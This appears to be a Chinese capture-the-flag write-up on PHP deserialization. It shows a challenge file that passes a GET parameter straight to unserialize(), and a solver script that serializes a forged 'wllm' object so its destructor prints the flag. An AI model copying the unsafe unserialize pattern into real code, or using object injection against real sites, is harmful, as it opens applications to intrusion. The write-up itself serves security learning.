# 反序列化

## 提示

<!--
User-agent: *
Disallow: 什么东西呢？
-->
这东西指向robots.txt

直接路径访问即可

获取关键信息: /cl45s.php

内容如下:

## php源码

```php
<?php

error_reporting(0);
show_source("cl45s.php");

class wllm
{

    public $admin;
    public $passwd;

    public function __construct()
    {
        $this->admin = "user";
        $this->passwd = "123456";
    }

    public function __destruct()
    {
        if ($this->admin === "admin" && $this->passwd === "ctf") {
            include ("flag.php");
            echo $flag;
        } else {
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}

$p = $_GET['p'];
unserialize($p);

?>
```

因此同样构造一个类, 然后序列化, 然后url编码; (有一些不可见字符可能丢失;)

```php

<?php
class wllm {
    public $admin;
    public $passwd;

    public function __construct($admin, $passwd) {
        $this->admin = $admin;
        $this->passwd = $passwd;
    }
}

// 创建 wllm 类的实例并设置属性
$instance = new wllm("admin", "ctf");

// 序列化实例
$serialized = serialize($instance);

// 输出序列化字符串
echo $serialized;
?>
